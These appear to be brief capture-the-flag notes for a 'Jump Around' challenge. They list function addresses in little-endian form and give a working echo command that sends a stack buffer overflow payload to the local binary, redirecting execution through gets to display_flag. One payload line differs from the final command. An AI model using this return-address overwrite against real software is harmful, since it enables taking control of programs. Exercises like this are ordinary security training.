# Jump Around
gets ==> 08049050 ==> 50900408 ==> \x50\x90\x04\x08
memory start ==> 0804c03d ==> 3dc00408 ==> \x3d\xc0\x04\x08
display_flag ==> 08049276 ==> 76920408 ==> \x76\x92\x04\x08

AAAAAAAAAAAAAAABBBBCCCCDDDDD
\x09\xd0\x04\x08\x76\x92\x04\x08\x3d\xc0\x04\x08\n123\n

echo -e -n 'AAAAAAAAAAAAAAABBBBCCCCDDDDD\x50\x90\x04\x08\x76\x92\x04\x08\x3d\xc0\x04\x08\n123\n' | ./jump_around
